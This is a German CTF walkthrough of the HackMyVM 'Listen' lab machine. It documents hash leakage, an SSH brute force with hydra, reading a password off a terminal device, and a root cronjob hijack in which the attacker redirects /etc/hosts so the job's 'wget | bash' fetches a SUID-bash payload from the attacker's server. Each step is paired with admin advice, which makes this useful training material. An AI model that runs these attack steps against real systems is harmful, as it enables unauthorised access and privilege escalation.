@@ -1,0 +1,496 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Listen - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Listen - HackMyVM - Medium - Bericht</h1> <!-- Titel und Level angepasst -->
+        <div class="level-container">
+            <!-- H2 ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+            <h2>Medium</h2>
+            <div class="circle">
+                <!-- Segmente ohne Inline-Style, Farbe wird durch CSS gesteuert (sollte auf Gelb angepasst werden) -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Innerer Kreis ohne Inline-Style, Farbe wird durch CSS gesteuert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">hydra</div> <!-- oder john -->
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">python3</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">ps</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">who</div>
+                <div class="tool-item">w</div>
+                <div class="tool-item">sh</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">bash</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">nano / vi</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#information-disclosure">Information Disclosure (Web & Hash)</a></li>
+                <li><a href="#credential-access">Credential Access (Password Cracking)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH as leo)</a></li>
+                <li><a href="#privilege-escalation-discovery">Privilege Escalation Vector Discovery</a></li>
+                <li><a href="#lateral-movement">Lateral Movement (leo -> silence -> listen)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (listen -> root via Cronjob Hijack)</a></li>
+                <li><a href="#poc">Proof of Concept (POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>192.168.2.111	08:00:27:4a:b5:57	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein ARP-Scan wird im lokalen Netzwerk ausgeführt, um aktive Hosts zu finden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.111` wird identifiziert (Oracle VirtualBox).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Ziel-IP ist bekannt. Führen Sie einen Portscan durch.
+<br><strong>Empfehlung (Admin):** Standard-Netzwerk-Monitoring.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.111 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-05 01:18 CET
+Nmap scan report for listen (192.168.2.111)
+Host is up (0.00014s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE    SERVICE VERSION
+<span class="command">22/tcp filtered ssh</span>
+<span class="command">80/tcp filtered http</span>
+MAC Address: 08:00:27:4A:B5:57 (Oracle VirtualBox virtual NIC)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.14 ms listen (192.168.2.111)
+
+OS and Service detection performed...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan wird durchgeführt, um offene Ports und Dienste auf `192.168.2.111` zu identifizieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Nmap meldet Port 22 (SSH) und Port 80 (HTTP) als `filtered`. Dies bedeutet, dass Nmap keine klare Antwort (weder offen noch geschlossen) von diesen Ports erhalten hat, was oft auf eine Firewall hindeutet, die die Pakete verwirft. Es ist jedoch ungewöhnlich, dass *alle* Standardports gefiltert sind. Dies könnte auf eine spezifische Firewall-Konfiguration oder ein Problem während des Scans hindeuten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Da die Standardports gefiltert erscheinen, versuchen Sie alternative Scan-Techniken (z.B. `-sT` Connect Scan, `-sA` ACK Scan) oder überprüfen Sie die Firewall-Regeln, falls möglich. Untersuchen Sie den Webserver auf Port 80 manuell oder mit Tools, die möglicherweise weniger von Firewalls blockiert werden (z.B. `curl`, Browser). Führen Sie eine Verzeichnis-Enumeration durch.
+<br><strong>Empfehlung (Admin):** Überprüfen Sie die Firewall-Konfiguration. Wenn die Ports erreichbar sein sollen, passen Sie die Regeln an. Wenn sie nicht erreichbar sein sollen, ist das Filterverhalten korrekt, aber stellen Sie sicher, dass die Dienste dahinter nicht unnötig laufen.</p>
+        </section>
+
+        <section id="information-disclosure">
+             <h2>Information Disclosure (Web & Hash)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Trotz des Nmap-Ergebnisses wird ein `gobuster`-Scan auf Port 80 durchgeführt.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://192.168.2.111 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,...[ext]... -b 404,403</span></div>
+                     <pre>
+===============================================================
+Gobuster v...
+...
+===============================================================
+[+] Url:                     <span class="command">http://192.168.2.111</span>
+...
+===============================================================
+... Starting gobuster ...
+===============================================================
+<span class="command">http://192.168.2.111/index.html</span>           (Status: 200) [Size: 1341]
+===============================================================
+... Finished ...
+===============================================================
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Überraschenderweise findet `gobuster` die Datei `index.html` mit Status 200. Dies widerspricht dem Nmap-Ergebnis ("filtered"). Es ist möglich, dass die Firewall nur bestimmte Nmap-Probes blockiert hat oder sich der Status geändert hat. Die `index.html` existiert.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Der Inhalt der `index.html` wird untersucht (Schritt nicht gezeigt). Im Quellcode oder auf der Seite selbst wird ein Gedicht und ein Passwort-Hash im Shadow-Format für den Benutzer `leo` gefunden.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Kein Prompt - Inhalt aus index.html extrahiert]</div>
+                     <pre>
+So please listen, and just hear me.
+And if you want to talk, wait a minute
+for your turn, and I will listen to you.
+
+-Leo Buscaglia
+
+Leo please, stop using your poems as password!
+<span class="password">leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Fund. Wir haben den Benutzernamen `leo` und seinen Passwort-Hash (`$6$` bedeutet SHA512-Crypt). Der Kommentar legt nahe, dass das Passwort mit dem Gedicht zusammenhängt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):**
+1.  Speichern Sie den Hash in einer Datei.
+2.  Erstellen Sie eine benutzerdefinierte Wortliste (`gedicht1.txt`), die Wörter, Zeilen oder Kombinationen aus dem Gedicht enthält.
+3.  Versuchen Sie, den Hash mit `john` oder `hashcat` und der Gedicht-Wortliste zu knacken. Versuchen Sie auch Standard-Wortlisten wie `rockyou.txt`.
+4.  Da SSH auf Port 22 (laut späterem Log) doch erreichbar ist, ist ein Brute-Force-Angriff auf SSH mit `hydra` und der Gedicht-Wortliste ebenfalls eine Option.
+<br><strong>Empfehlung (Admin):** Speichern Sie niemals Passwort-Hashes oder Hinweise auf Passwörter im Klartext auf Webseiten. Verwenden Sie keine leicht zu erratenden oder thematisch verbundenen Passwörter.</p>
+        </section>
+
+        <section id="credential-access">
+             <h2>Credential Access (Password Cracking)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der gefundene Hash für `leo` wird in eine Datei gespeichert.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+ └─# <span class="command">echo 'leo:$6$GyxLtjMYaQWxRxfl$w0mjIXfmU1T8bac2HgweZmxgFjGSiX8kbPDWhJzAzFn.BFk9X9fPT6DHXlp.A3J5yA64qQJH6Iu4K4AW4THIw.:18551:0:99999:7:::' > hash</span></div> <!-- Maskierung: > -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Anstatt den Hash direkt zu knacken, wird ein Brute-Force-Angriff auf SSH (Port 22) mit `hydra` durchgeführt. Es wird der Benutzername `leo` und eine benutzerdefinierte Wortliste `gedicht1.txt` (die vermutlich auf dem Gedicht basiert) verwendet.</p>
+              <div class="code-block">
+                  <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">hydra -l leo -P gedicht1.txt ssh://192.168.2.111:22 -I -t 64</span></div>
+                      <pre>
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak ... <span class="comment"><-- Maskierung: &</span>
+...
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-05 01:31:34
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+...
+[DATA] attacking ssh://192.168.2.111:22/
+[ATTEMPT] target 192.168.2.111 - login "leo" - pass "..." - ...
+<span class="password">[22][ssh] host: 192.168.2.111   login: leo   password: contribute</span>
+1 of 1 target successfully completed, 1 valid password found
+...
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-05 01:31:43
+</pre>
+                  </div>
+              </div>
+              <p class="evaluation"><strong>Bewertung:</strong> Hydra findet erfolgreich das Passwort `<span class="password">contribute</span>` für den Benutzer `leo`. Interessanterweise scheint das Passwort nicht direkt aus dem Gedicht zu stammen, obwohl die Wortliste darauf basierte (möglicherweise war 'contribute' auch in der Liste oder der Hinweis war irreführend).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Verwenden Sie die gefundenen Credentials (`leo`:`contribute`), um sich per SSH anzumelden.
+<br><strong>Empfehlung (Admin):** Verwenden Sie starke, nicht erratbare Passwörter. Implementieren Sie Brute-Force-Schutz für SSH (z.B. `fail2ban`).</p>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SSH as leo)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung als Benutzer `leo` mit dem gefundenen Passwort hergestellt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+ └─# <span class="command">ssh leo@listen.hmv</span></div> <!-- Hostname aus /etc/hosts wird verwendet -->
+                     <pre>
+The authenticity of host 'listen.hmv (192.168.2.111)' can't be established.
+ED25519 key fingerprint is SHA256:wjUcj6T6r6sq8a/m+aBJnDgmy0heMWF04F18Qfae3Q.
+...
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'listen.hmv' (ED25519) to the list of known hosts.
+leo@listen.hmv's password: <span class="password">[Passwort contribute eingegeben]</span>
+Linux listen 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+...
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, ...
+</pre>
+                     <div class="prompt">leo@listen:~$</div> <!-- Login erfolgreich -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login als `leo` ist erfolgreich. Der initiale Zugriff auf das System wurde erlangt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Führen Sie grundlegende Enumeration als `leo` durch: `id`, `pwd`, `ls -la`, `ls /home`, `sudo -l`, SUID-Dateien suchen.
+<br><strong>Empfehlung (Admin):** SSH-Zugriff überwachen.</p>
+        </section>
+
+        <section id="privilege-escalation-discovery">
+            <h2>Privilege Escalation Vector Discovery</h2>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `leo` wird eine Datei namens `poem` gefunden und deren Dateityp überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">leo@listen:~$ <span class="command">file poem</span></div>
+                     <pre><span class="command">poem: setuid, setgid ELF 64-bit LSB pie executable</span>, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=25ff2d15c48083f9091df18cd42f240457f745d3, not stripped</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Datei `poem` ist eine 64-bit ELF-Binärdatei mit SUID- und SGID-Bit. Dies bedeutet, dass sie mit den Rechten des Besitzers (wahrscheinlich `root` oder ein anderer privilegierter Benutzer) ausgeführt wird, unabhängig davon, wer sie startet. Dies ist ein hochinteressanter potenzieller Privilegieneskalations-Vektor.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die Home-Verzeichnisse werden aufgelistet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">leo@listen:~$ <span class="command">ls /home/</span></div>
+                     <pre>leo  listen  silence</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Es gibt drei Benutzer mit Home-Verzeichnissen: `leo`, `listen` und `silence`.</p>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die SUID-Binary `poem` wird zur weiteren Analyse auf das Angreifer-System heruntergeladen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">leo@listen:~$ <span class="command">python3 -m http.server</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+ └─# <span class="command">wget http://192.168.2.111:8000/poem</span></div>
+                     <pre>
+--2022-11-05 01:35:44--  http://192.168.2.111:8000/poem
+Connecting to 192.168.2.111:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 16872 (16K) [application/octet-stream]
+Saving to: ‘poem’
+
+poem                 100%[===================>]  16.48K  --.-KB/s    in 0s
+
+2022-11-05 01:35:44 (570 MB/s) - ‘poem’ saved [16872/16872]
+</pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Die laufenden Prozesse werden untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">leo@listen:/home/listen$ <span class="command">ps -ef</span></div>
+                     <pre>
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 20:17 ?        00:00:01 /sbin/init
+...
+root       380     1  0 20:17 ?        00:00:00 /usr/sbin/cron -f
+...
+leo        822   810  0 20:33 ?        00:00:00 sshd: leo@pts/0
+leo        823   822  0 20:33 pts/0    00:00:00 -bash
+<span class="command">root      1011   380  0 20:48 ?        00:00:00 /usr/sbin/CRON -f</span>
+<span class="command">root      1016  1011  0 20:48 ?        00:00:00 /bin/sh -c sh /home/listen/listentome.sh</span>
+<span class="command">root      1019  1016  0 20:48 ?        00:00:00 sh /home/listen/listentome.sh</span>
+<span class="command">root      1020  1019  0 20:48 ?        00:00:00 wget -O - -q http://listen/ihearyou.sh</span> <span class="comment"><-- Interessant!</span>
+<span class="command">root      1021  1019  0 20:48 ?        00:00:00 bash</span> <span class="comment"><-- Führt die Ausgabe von wget aus!</span>
+... (Wiederholungen des Cronjobs alle Minute) ...
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Prozessliste zeigt einen Cronjob, der alle Minute als `root` läuft. Dieser Cronjob führt `/home/listen/listentome.sh` aus. Dieses Skript wiederum verwendet `wget`, um `http://listen/ihearyou.sh` herunterzuladen (`-O -` leitet auf stdout um, `-q` quiet mode) und das Ergebnis direkt an `bash` weiterzuleiten. Dies ist ein weiterer kritischer Privilegieneskalations-Vektor. Wenn der Angreifer die DNS-Auflösung für den Hostnamen `listen` auf seine eigene IP umleiten und einen HTTP-Server mit einer bösartigen `ihearyou.sh` betreiben kann, wird dieser Code als `root` ausgeführt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Zwei vielversprechende Pfade:
+1.  **SUID Binary `poem`:** Analysieren Sie `poem` offline (z.B. mit Ghidra, GDB, `ltrace`, `strace`), um herauszufinden, wie das SUID/SGID-Bit zur Eskalation genutzt werden kann (z.B. Buffer Overflow, unsicherer Funktionsaufruf, Umgebungsvariablen).
+2.  **Cronjob Hijack:** Versuchen Sie, die DNS-Auflösung für `listen` auf dem Zielsystem zu manipulieren (z.B. durch Bearbeiten von `/etc/hosts`, falls möglich, oder DNS-Spoofing). Starten Sie einen HTTP-Server auf Ihrer Maschine auf Port 80 und stellen Sie eine Datei `ihearyou.sh` bereit, die eine Reverse Shell oder einen anderen Payload enthält (z.B. Erstellen einer SUID-Bash).
+<br><strong>Empfehlung (Admin):**
+1.  Entfernen Sie das SUID/SGID-Bit von der `poem`-Datei (`chmod ug-s /home/leo/poem`), es sei denn, es ist absolut notwendig und sicher implementiert.
+2.  Beheben Sie den unsicheren Cronjob: Führen Sie Skripte nicht direkt aus `wget`-Downloads aus. Validieren Sie heruntergeladene Skripte. Verwenden Sie Hostnamen nur, wenn DNS sicher ist, oder nutzen Sie IP-Adressen oder lokale Pfade. Führen Sie Cronjobs mit minimal notwendigen Rechten aus.</p>
+        </section>
+
+        <section id="lateral-movement">
+            <h2>Lateral Movement (leo -> silence -> listen)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Es wird versucht, zum Benutzer `silence` zu wechseln. Das Passwort `<span class="password">listentome</span>` wird verwendet.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">leo@listen:/home/listen$ <span class="command">su silence</span></div>
+                     <pre>Password: <span class="password">[Passwort listentome eingegeben]</span></pre>
+                     <div class="prompt">silence@listen:/home/listen$</div> <!-- Wechsel erfolgreich -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Wechsel zu `silence` gelingt. Das Passwort `listentome` muss zuvor durch einen nicht gezeigten Schritt (z.B. Analyse von `poem`, Wireshark-Sniffing wie angedeutet, aber unklar) erlangt worden sein.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Als `silence` werden Dateien im Home-Verzeichnis untersucht.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">silence@listen:~$ <span class="command">cat note.txt</span></div>
+                     <pre>"listen" told me that if I listen, I will hear his password....</pre>
+                    <div class="prompt">silence@listen:~$ <span class="command">cat listen.sh</span></div>
+                     <pre>#!/bin/sh
+cat /home/listen/password.txt > /dev/pts/4 <span class="comment"><-- Schreibt Passwort nach pts/4!</span></pre> <!-- Maskierung -->
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Notiz bestätigt den Hinweis auf das Passwort von `listen`. Das Skript `listen.sh` zeigt, dass das Passwort von `listen` (aus `/home/listen/password.txt`) in das Terminal `/dev/pts/4` geschrieben wird. Dies ist wahrscheinlich Teil eines Mechanismus, bei dem `silence` das Passwort von `listen` "hören" kann.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die aktiven Terminals werden überprüft.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">silence@listen:~$ <span class="command">who</span></div>
+                     <pre>leo      pts/0        2022-11-04 20:33 (192.168.2.121)</pre>
+                     <div class="prompt">silence@listen:~$ <span class="command">w</span></div>
+                     <pre>
+ 21:13:41 up 55 min,  5 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+leo      <span class="command">pts/0</span>    192.168.2.121    20:33    2:26   0.07s  0.00s sshd: leo [priv]
+silence  <span class="command">pts/1</span>    192.168.2.121    21:12    1:18   0.01s  0.01s -bash
+silence  <span class="command">pts/2</span>    192.168.2.121    21:13   31.00s  0.01s  0.01s -bash
+silence  <span class="command">pts/3</span>    192.168.2.121    21:13   21.00s  0.01s  0.01s -bash
+silence  <span class="command">pts/4</span>    192.168.2.121    21:13    3.00s  0.01s  0.00s w <span class="comment"><-- Ziel-TTY!</span>
+</pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `silence` ist auf mehreren Terminals angemeldet, einschließlich `pts/4`. Wenn das Skript `listen.sh` (vermutlich durch einen Cronjob oder eine andere Aktion von `listen`) ausgeführt wird, kann `silence` das Passwort von `listen` lesen, indem er den Inhalt von `/dev/pts/4` beobachtet.</p>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Das Passwort wird aus `pts/4` gelesen (impliziert, da `cat pts/4` einen Fehler wirft, wenn es zu spät ausgeführt wird) und lautet `<span class="password">shhhhhh</span>`. Es wird zu `listen` gewechselt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">silence@listen:~$ <span class="command">cat /dev/pts/4</span></div> <!-- Annahme: Wird ausgeführt, wenn Passwort geschrieben wird -->
+                     <pre><span class="password">shhhhhh</span></pre>
+                     <div class="prompt">silence@listen:~$ <span class="command">su listen</span></div>
+                     <pre>Password: <span class="password">[Passwort shhhhhh eingegeben]</span></pre>
+                     <div class="prompt">listen@listen:~$</div> <!-- Wechsel erfolgreich -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die User-Flag wird als `listen` gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">listen@listen:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">HMVimlistening</span></pre>
+                 </div>
+             </div>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Lateral Movement zu `listen` war erfolgreich durch Ausnutzung des Mechanismus mit `listen.sh` und `/dev/pts/4`. Das User-Flag wurde gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Nun als `listen` nach Privilegieneskalation zu Root suchen. Der zuvor entdeckte Cronjob ist der wahrscheinlichste Vektor.
+<br><strong>Empfehlung (Admin):** Passwörter niemals in Klartextdateien speichern oder unverschlüsselt an Terminals senden. Dieser Mechanismus ist extrem unsicher. Überprüfen und sichern Sie alle Skripte und Cronjobs.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation (listen -> root via Cronjob Hijack)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der Cronjob, der als Root `/home/listen/listentome.sh` ausführt und dann `wget http://listen/ihearyou.sh | bash` macht, wird ausgenutzt.</p>
+            <p class="analysis"><strong>Analyse Fortsetzung:** Der Angreifer erstellt eine bösartige `ihearyou.sh`-Datei, die eine SUID-Bash-Kopie erstellt.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+ └─# <span class="command">vi ihearyou.sh</span></div>
+                     <pre>
+#!/bin/bash
+cp /bin/bash /tmp/bashroot; chmod +s /tmp/bashroot
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Angreifer startet einen Python-HTTP-Server auf Port 80 auf seiner Maschine, um `ihearyou.sh` bereitzustellen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+ └─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Damit der `wget`-Befehl auf dem Ziel (`wget http://listen/...`) die Datei vom Angreifer holt, muss die DNS-Auflösung für `listen` auf die IP des Angreifers zeigen. Dies wird hier durch Bearbeiten der `/etc/hosts`-Datei *auf dem Zielsystem* als Benutzer `listen` erreicht (die Berechtigungen dafür sind unklar, normalerweise hat ein normaler Benutzer keine Schreibrechte auf `/etc/hosts`).</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">listen@listen:~$ <span class="command">nano /etc/hosts</span></div>
+                     <pre>[Datei bearbeitet, um 'listen' auf Angreifer-IP zu mappen]
+127.0.0.1       localhost
+<span class="command">192.168.2.121   listen</span> <span class="comment"><-- Angreifer-IP</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Der Angreifer wartet, bis der Cronjob läuft und `ihearyou.sh` herunterlädt und ausführt. Die Log-Ausgabe des Python-Servers bestätigt den Download.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~/Hackingtools]
+ └─# <span class="command">python3 -m http.server 80</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+<span class="password">192.168.2.111 - - [05/Nov/2022 02:21:55] "GET /ihearyou.sh HTTP/1.1" 200 -</span> <span class="comment"><-- Download durch Cronjob</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse Fortsetzung:** Als Benutzer `listen` wird überprüft, ob die SUID-Datei `/tmp/bashroot` erstellt wurde. Sie wird dann mit der Option `-p` ausgeführt, um Root-Rechte zu erhalten.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">listen@listen:~$ <span class="command">cd /tmp/</span></div>
+                    <div class="prompt">listen@listen:/tmp$ <span class="command">ls</span></div>
+                    <pre><span class="command">bashroot</span>  systemd-private-...</pre>
+                    <div class="prompt">listen@listen:/tmp$ <span class="command">./bashroot -p</span></div>
+                     <div class="prompt">bashroot-5.0# <span class="command">id</span></div>
+                     <pre><span class="password">uid=1002(listen) gid=1002(listen) euid=0(root) egid=0(root) groups=0(root),1002(listen)</span></pre>
+                     <div class="prompt">bashroot-5.0#</div> <!-- Root-Shell! -->
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse Fortsetzung:** Die Root-Flag wird gelesen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">bashroot-5.0# <span class="command">cd /root</span></div>
+                    <div class="prompt">bashroot-5.0# <span class="command">ls</span></div>
+                    <pre>knockme.py  root.txt  silence.py</pre>
+                    <div class="prompt">bashroot-5.0# <span class="command">cat root.txt</span></div>
+                    <pre><span class="password">HMVthxforlisten</span></pre>
+                 </div>
+             </div>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation zu Root war erfolgreich durch Ausnutzung des unsicheren Cronjobs in Kombination mit der (angenommenen) Möglichkeit, die DNS-Auflösung für `listen` zu manipulieren und eine bösartige Datei über HTTP bereitzustellen. Das Erstellen einer SUID-Bash ist ein klassischer Payload.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):** Dokumentieren Sie den Cronjob-Hijacking-Vektor und die Methode zur Umleitung der DNS-Anfrage.
+<br><strong>Empfehlung (Admin):** Beheben Sie den unsicheren Cronjob (siehe vorherige Empfehlung). Stellen Sie sicher, dass `/etc/hosts` nicht von unprivilegierten Benutzern bearbeitet werden kann. Überwachen Sie DNS-Anfragen und HTTP-Verbindungen von Servern.</p>
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (POC)</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Dieser POC beschreibt die Verkettung von Schwachstellen: Finden eines Passwort-Hashes auf der Webseite, Knacken des Passworts für Benutzer `leo`, SSH-Login, Lateral Movement zu `silence` und `listen` durch Ausnutzen unsicherer Skripte und Passwort-Weitergabe und schließlich Privilegieneskalation zu Root durch Hijacking eines Cronjobs, der `wget | bash` als Root ausführt.</p>
+
+            <h3>POC Schritt 1: Initial Access (leo)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Passwort-Hash auf Webseite, schwaches Passwort.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde Hash `leo:$6$...` auf `index.html`.</li>
+                <li>Knacke Hash oder brute-force SSH mit Gedicht-Wortliste (Passwort: `contribute`).</li>
+                <li>Login: `ssh leo@listen.hmv`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als `leo`.</p>
+
+            <h3>POC Schritt 2: Lateral Movement (leo -> silence -> listen)</h3>
+            <p class="analysis"><strong>Schwachstellen:</strong> Klartextpasswort in Datei, unsicheres Skript schreibt Passwort in TTY.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `leo`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde Passwort für `silence` (`listentome`) - (Quelle im Log unklar, Annahme: `poem` Analyse o.ä.).</li>
+                <li>Wechsle Benutzer: `su silence`.</li>
